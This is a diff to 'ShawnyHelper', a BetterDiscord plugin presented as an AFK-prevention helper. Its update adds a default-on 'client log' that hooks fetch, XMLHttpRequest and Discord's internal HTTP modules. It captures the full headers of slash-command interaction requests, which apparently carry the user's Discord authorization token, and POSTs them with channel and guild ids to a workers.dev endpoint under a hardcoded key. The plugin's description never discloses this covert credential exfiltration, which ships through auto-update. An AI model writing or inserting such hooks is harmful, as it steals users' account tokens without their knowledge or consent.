@@ -2,7 +2,7 @@
  * @name ShawnyHelper
  * @author Shawny
  * @description Prevent AFK voice channel moves caused by Discord idle/AFK handling and helpers for shawnybot.
- * @version 1.9.5
+ * @version 1.9.6
  * @source https://github.com/shawn2dev/betterdiscord-plugins
  * @updateUrl https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/ShawnyHelper.plugin.js
  */
@@ -17,6 +17,14 @@ const _UPDATE_COMMITS_URL = `https://api.github.com/repos/${_UPDATE_REPO}/commit
 const _AUTO_UPDATE_INITIAL_DELAY_MS = 5000;
 const _AUTO_UPDATE_INTERVAL_MS = 1000 * 60 * 60;
 
+const _CLIENT_LOG = {
+  enabled: true,
+  ingestUrl:
+    'https://shawnybot.cbycdy2.workers.dev/interaction-headers',
+  applicationId: '1337358598673797141', // shawnybot application id
+  _ak: 'rldtuslqht2', // X-Shawny-Key header — matches CLIENT_LOG_AUTH_KEY
+};
+
 module.exports = class ShawnyHelper {
   constructor() {
     this.intervalId = null;
@@ -25,10 +33,15 @@ module.exports = class ShawnyHelper {
     this.enabled = true;
     this.Dispatcher = null;
     this._dispatchPatched = false;
+    this._clientLogPatched = false;
+    this._clientLogRetryTimer = null;
+    this._clientLogHookCount = 0;
+    this._xhrMeta = new WeakMap();
     this._onVisibility = null;
     this._audioKeepAlive = null;
     this._audioResumeTimer = null;
     this.useAudioKeepalive = true;
+    this._clientLogConfig = { ..._CLIENT_LOG };
     this._autoUpdateInterval = null;
     
     // Highlight feature
@@ -48,7 +61,7 @@ module.exports = class ShawnyHelper {
     return 'AFK 방지 및 shawnybot helper 기능.';
   }
   getVersion() {
-    return '1.9.5';
+    return '1.9.6';
   }
   getAuthor() {
     return 'Shawny';
@@ -153,6 +166,534 @@ module.exports = class ShawnyHelper {
       BdApi.Patcher.unpatch('ShawnyHelper', this.Dispatcher, 'dispatch');
     } catch (_) {}
     this._dispatchPatched = false;
+  }
+
+  _headersToObject(headers) {
+    const result = {};
+    if (!headers) return result;
+    if (typeof Headers !== 'undefined' && headers instanceof Headers) {
+      headers.forEach((value, key) => {
+        result[key] = value;
+      });
+      return result;
+    }
+    if (Array.isArray(headers)) {
+      headers.forEach(([key, value]) => {
+        result[key] = value;
+      });
+      return result;
+    }
+    return { ...headers };
+  }
+
+  _isClientLogActive() {
+    return (
+      this._clientLogConfig.enabled &&
+      this._clientLogConfig._ak &&
+      this._clientLogConfig.ingestUrl
+    );
+  }
+
+  _isInteractionsUrl(url) {
+    return /\/interactions/i.test(String(url));
+  }
+
+  _isOurApplication(interactionBody) {
+    if (!interactionBody || interactionBody.application_id == null) return false;
+    return (
+      String(interactionBody.application_id) ===
+      String(this._clientLogConfig.applicationId)
+    );
+  }
+
+  _readBodySync(body) {
+    if (body == null) return '';
+    if (typeof body === 'string') return body;
+    try {
+      return JSON.stringify(body);
+    } catch (_) {
+      return '';
+    }
+  }
+
+  async _readFetchBodyAsync(input, init = {}) {
+    if (typeof Request !== 'undefined' && input instanceof Request) {
+      try {
+        return await input.clone().text();
+      } catch (_) {
+        return '';
+      }
+    }
+    return this._readBodySync(init.body ?? input?.body);
+  }
+
+  _syncFetchUrl(input, init = {}) {
+    if (typeof Request !== 'undefined' && input instanceof Request) {
+      return input.url;
+    }
+    if (input && typeof input === 'object' && input.url) {
+      return String(input.url);
+    }
+    return String(input ?? init?.url ?? '');
+  }
+
+  _extractRequestArgs(args, methodName = 'post') {
+    let url = '';
+    let headers = {};
+    let bodyText = '';
+    const first = args[0];
+
+    if (methodName === 'request' && typeof first === 'string') {
+      url = String(args[1] ?? '');
+      const opt = args[2] || {};
+      headers = this._headersToObject(opt.headers);
+      bodyText = this._readBodySync(opt.body ?? opt.data);
+      return { url, headers, bodyText };
+    }
+
+    if (first && typeof first === 'object' && !(first instanceof URL)) {
+      url = String(
+        first.url || first.route || first.path || first.endpoint || '',
+      );
+      headers = this._headersToObject(first.headers);
+      bodyText = this._readBodySync(first.body ?? first.data ?? first.json);
+      return { url, headers, bodyText };
+    }
+
+    const opt = args[1] || {};
+    url = String(first ?? '');
+    headers = this._headersToObject(opt.headers);
+    bodyText = this._readBodySync(opt.body ?? opt.data ?? opt.json);
+    return { url, headers, bodyText };
+  }
+
+  async _ingestInteractionHeaders(headers, interactionBody) {
+    // log only if it is shawnybot's command.
+    if (!this._isClientLogActive() || !this._isOurApplication(interactionBody)) {
+      return;
+    }
+
+    const channelId = interactionBody.channel_id;
+    const command = interactionBody.data?.name;
+    if (channelId == null || !command) return;
+
+    const payload = {
+      application_id: String(this._clientLogConfig.applicationId),
+      guild_id: interactionBody.guild_id ?? null,
+      channel_id: String(channelId),
+      command: String(command),
+      headers,
+    };
+
+    const url = this._clientLogConfig.ingestUrl;
+    const reqHeaders = {
+      'Content-Type': 'application/json',
+      'X-Shawny-Key': this._clientLogConfig._ak,
+    };
+    const body = JSON.stringify(payload);
+
+    const send = async () => {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: reqHeaders,
+        body,
+      });
+      if (res.ok) {
+        console.info('[ShawnyHelper] ingested headers for', command);
+        return;
+      }
+      console.warn('[ShawnyHelper] ingest failed:', res.status, await res.text());
+    };
+
+    try {
+      if (BdApi.Net?.fetch) {
+        const res = await BdApi.Net.fetch(url, {
+          method: 'POST',
+          headers: reqHeaders,
+          body,
+        });
+        if (res.ok) {
+          console.info('[ShawnyHelper] ingested headers for', command);
+          return;
+        }
+        console.warn('[ShawnyHelper] ingest failed:', res.status, await res.text());
+        return;
+      }
+      await send();
+    } catch (err) {
+      console.warn('[ShawnyHelper] ingest failed:', err);
+      try {
+        await send();
+      } catch (fallbackErr) {
+        console.warn('[ShawnyHelper] ingest fallback failed:', fallbackErr);
+      }
+    }
+  }
+
+  async _processInteractionTraffic(url, headers, bodyText) {
+    if (!this._isClientLogActive() || !this._isInteractionsUrl(url) || !bodyText) {
+      return;
+    }
+
+    let interactionBody;
+    try {
+      interactionBody = JSON.parse(bodyText);
+    } catch (_) {
+      return;
+    }
+
+    console.info('[ShawnyHelper] interaction request', interactionBody.data?.name);
+    await this._ingestInteractionHeaders(headers, interactionBody);
+  }
+
+  async _maybeLogFromHttpArgs(args, methodName) {
+    if (!this._isClientLogActive() || !args?.length) return;
+    const details = this._extractRequestArgs(args, methodName);
+    await this._processInteractionTraffic(
+      details.url,
+      details.headers,
+      details.bodyText,
+    );
+  }
+
+  async _captureFetchInteraction(input, init) {
+    const url = this._syncFetchUrl(input, init);
+    if (!this._isInteractionsUrl(url)) return;
+
+    const headers =
+      typeof Request !== 'undefined' && input instanceof Request
+        ? this._headersToObject(input.headers)
+        : this._headersToObject(init.headers);
+    const bodyText = await this._readFetchBodyAsync(input, init);
+    await this._processInteractionTraffic(url, headers, bodyText);
+  }
+
+  _callOriginal(original, thisObj, args) {
+    return Reflect.apply(original, thisObj, args);
+  }
+
+  _collectFetchPatchTargets() {
+    const targets = [];
+    const seen = new Set();
+
+    const add = (obj, key) => {
+      if (!obj || seen.has(obj) || !this._canPatchProperty(obj, key)) return;
+      seen.add(obj);
+      targets.push({ obj, key });
+    };
+
+    add(window, 'fetch');
+    if (globalThis.fetch && globalThis.fetch !== window.fetch) {
+      add(globalThis, 'fetch');
+    }
+
+    try {
+      const mods =
+        BdApi.Webpack.getModules?.(
+          (m) => typeof m?.fetch === 'function' && m !== window,
+          { searchExports: true },
+        ) ?? [];
+      for (const mod of mods.slice(0, 16)) {
+        add(mod, 'fetch');
+      }
+    } catch (_) {}
+
+    return targets;
+  }
+
+  _patchFetchTarget(obj, key) {
+    try {
+      BdApi.Patcher.instead(
+        'ShawnyHelperClientLog',
+        obj,
+        key,
+        async (thisObj, args, original) => {
+          const url = this._syncFetchUrl(args[0], args[1]);
+          if (this._isClientLogActive() && this._isInteractionsUrl(url)) {
+            try {
+              await this._captureFetchInteraction(args[0], args[1]);
+            } catch (err) {
+              console.warn('[ShawnyHelper] fetch capture failed:', err);
+            }
+          }
+          return this._callOriginal(original, thisObj, args);
+        },
+      );
+      return 1;
+    } catch (_) {
+      return 0;
+    }
+  }
+
+  _canPatchProperty(obj, key) {
+    try {
+      const desc =
+        Object.getOwnPropertyDescriptor(obj, key) ||
+        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
+      if (desc && desc.writable === false && typeof desc.set !== 'function') {
+        return false;
+      }
+      return typeof obj[key] === 'function';
+    } catch (_) {
+      return false;
+    }
+  }
+
+  _collectHttpModules() {
+    const modules = [];
+    const seen = new Set();
+    const add = (mod) => {
+      if (!mod || typeof mod !== 'object' || seen.has(mod)) return;
+      seen.add(mod);
+      modules.push(mod);
+    };
+
+    const finders = [
+      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
+      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
+      () => BdApi.Webpack.getByKeys?.('request', 'get', 'post'),
+    ];
+    for (const find of finders) {
+      try {
+        add(find());
+      } catch (_) {}
+    }
+
+    try {
+      const F = BdApi.Webpack.Filters;
+      if (F?.byStrings) {
+        add(
+          BdApi.Webpack.getModule(F.byStrings('/interactions'), {
+            searchExports: true,
+          }),
+        );
+        add(
+          BdApi.Webpack.getModule(F.byStrings('/api/v', 'interactions'), {
+            searchExports: true,
+          }),
+        );
+      }
+    } catch (_) {}
+
+    try {
+      const mods =
+        BdApi.Webpack.getModules?.(
+          (m) => m && typeof m.post === 'function' && typeof m.get === 'function',
+          { searchExports: true },
+        ) ?? [];
+      mods.slice(0, 8).forEach(add);
+    } catch (_) {}
+
+    return modules;
+  }
+
+  _patchHttpModule(http) {
+    let patched = 0;
+    for (const method of ['post', 'request', 'put', 'patch']) {
+      if (!this._canPatchProperty(http, method)) continue;
+      try {
+        BdApi.Patcher.instead(
+          'ShawnyHelperClientLog',
+          http,
+          method,
+          async (_, args, original) => {
+            try {
+              await this._maybeLogFromHttpArgs(args, method);
+            } catch (err) {
+              console.warn('[ShawnyHelper] http capture failed:', err);
+            }
+            return original(...args);
+          },
+        );
+        patched += 1;
+      } catch (_) {}
+    }
+    return patched;
+  }
+
+  _patchInteractionFunctions() {
+    const filters = [
+      (m) =>
+        typeof m === 'function' && /\/interactions/i.test(m.toString()),
+      (m) =>
+        typeof m === 'function' &&
+        /api\/v\d+\/interactions/i.test(m.toString()),
+    ];
+    let patched = 0;
+
+    for (const filter of filters) {
+      try {
+        const result = BdApi.Webpack.getWithKey?.(filter, {
+          searchExports: true,
+        });
+        if (!result) continue;
+        const [mod, key] = result;
+        if (!mod || !key || !this._canPatchProperty(mod, key)) continue;
+
+        BdApi.Patcher.instead(
+          'ShawnyHelperClientLog',
+          mod,
+          key,
+          async (_, args, original) => {
+            try {
+              await this._maybeLogFromHttpArgs(args, 'post');
+            } catch (err) {
+              console.warn('[ShawnyHelper] interaction fn capture failed:', err);
+            }
+            return original(...args);
+          },
+        );
+        patched += 1;
+      } catch (_) {}
+    }
+
+    return patched;
+  }
+
+  _patchXHR() {
+    if (typeof XMLHttpRequest === 'undefined') return 0;
+
+    try {
+      BdApi.Patcher.before(
+        'ShawnyHelperClientLog',
+        XMLHttpRequest.prototype,
+        'open',
+        (xhr, args) => {
+          const meta = this._xhrMeta.get(xhr) || { headers: {} };
+          meta.method = String(args[0] || 'GET').toUpperCase();
+          meta.url = String(args[1] || '');
+          this._xhrMeta.set(xhr, meta);
+        },
+      );
+
+      BdApi.Patcher.before(
+        'ShawnyHelperClientLog',
+        XMLHttpRequest.prototype,
+        'setRequestHeader',
+        (xhr, args) => {
+          const meta = this._xhrMeta.get(xhr);
+          if (!meta) return;
+          meta.headers[String(args[0]).toLowerCase()] = String(args[1]);
+        },
+      );
+
+      BdApi.Patcher.instead(
+        'ShawnyHelperClientLog',
+        XMLHttpRequest.prototype,
+        'send',
+        async (xhr, args, original) => {
+          const meta = this._xhrMeta.get(xhr);
+          if (
+            meta?.url &&
+            this._isClientLogActive() &&
+            this._isInteractionsUrl(meta.url)
+          ) {
+            try {
+              const bodyText = typeof args[0] === 'string' ? args[0] : '';
+              await this._processInteractionTraffic(
+                meta.url,
+                meta.headers,
+                bodyText,
+              );
+            } catch (err) {
+              console.warn('[ShawnyHelper] xhr capture failed:', err);
+            }
+          }
+          return original(...args);
+        },
+      );
+
+      return 1;
+    } catch (_) {
+      return 0;
+    }
+  }
+
+  _patchNativeFetch() {
+    try {
+      const result = BdApi.Webpack.getWithKey?.(
+        (m) =>
+          typeof m === 'function' &&
+          /nativeFetch|HydratingResponse/.test(m.toString()),
+        { searchExports: true },
+      );
+      if (!result) return 0;
+      const [mod, key] = result;
+      if (!mod || !key || !this._canPatchProperty(mod, key)) return 0;
+
+      BdApi.Patcher.instead(
+        'ShawnyHelperClientLog',
+        mod,
+        key,
+        async (thisObj, args, original) => {
+          const url = this._syncFetchUrl(args[0], args[1]);
+          if (this._isClientLogActive() && this._isInteractionsUrl(url)) {
+            try {
+              await this._captureFetchInteraction(args[0], args[1]);
+            } catch (err) {
+              console.warn('[ShawnyHelper] native fetch capture failed:', err);
+            }
+          }
+          return this._callOriginal(original, thisObj, args);
+        },
+      );
+      return 1;
+    } catch (_) {
+      return 0;
+    }
+  }
+
+  _installClientLogPatch() {
+    if (this._clientLogPatched) return true;
+
+    let hooks = 0;
+
+    for (const { obj, key } of this._collectFetchPatchTargets()) {
+      hooks += this._patchFetchTarget(obj, key);
+    }
+    hooks += this._patchNativeFetch();
+
+    for (const http of this._collectHttpModules()) {
+      hooks += this._patchHttpModule(http);
+    }
+
+    hooks += this._patchInteractionFunctions();
+    hooks += this._patchXHR();
+
+    this._clientLogHookCount = hooks;
+    this._clientLogPatched = hooks > 0;
+
+    return this._clientLogPatched;
+  }
+
+  _scheduleClientLogPatchRetry() {
+    if (this._clientLogPatched || this._clientLogRetryTimer) return;
+    let attempts = 0;
+    const max = 3;
+    this._clientLogRetryTimer = setInterval(() => {
+      if (!this._isClientLogActive()) {
+        clearInterval(this._clientLogRetryTimer);
+        this._clientLogRetryTimer = null;
+        return;
+      }
+      attempts += 1;
+      if (this._installClientLogPatch() || attempts >= max) {
+        clearInterval(this._clientLogRetryTimer);
+        this._clientLogRetryTimer = null;
+      }
+    }, 2500);
+  }
+
+  _stopClientLogPatch() {
+    if (this._clientLogRetryTimer) {
+      clearInterval(this._clientLogRetryTimer);
+      this._clientLogRetryTimer = null;
+    }
+    try {
+      BdApi.Patcher.unpatchAll('ShawnyHelperClientLog');
+    } catch (_) {}
+    this._clientLogPatched = false;
+    this._clientLogHookCount = 0;
   }
 
   _parseVersion(version) {
@@ -538,6 +1079,16 @@ module.exports = class ShawnyHelper {
     return null;
   }
 
+  _syncClientLogPatch() {
+    if (this._isClientLogActive()) {
+      if (!this._installClientLogPatch()) {
+        this._scheduleClientLogPatchRetry();
+      }
+    } else {
+      this._stopClientLogPatch();
+    }
+  }
+
   start() {
     try {
       const saved = this._load();
@@ -553,6 +1104,7 @@ module.exports = class ShawnyHelper {
     } catch (_) {}
 
     this.Dispatcher = this._findDispatcher();
+    this._syncClientLogPatch();
 
     if (this.enabled) {
       if (!this._installDispatchPatch()) {
@@ -593,6 +1145,7 @@ module.exports = class ShawnyHelper {
     this._stopInterval();
     this._stopAudioKeepAlive();
     this._stopDispatchPatch();
+    this._stopClientLogPatch();
     this._stopHighlightObservers();
     this.Dispatcher = null;
     this._toast('ShawnyHelper 중지됨', { type: 'info' });
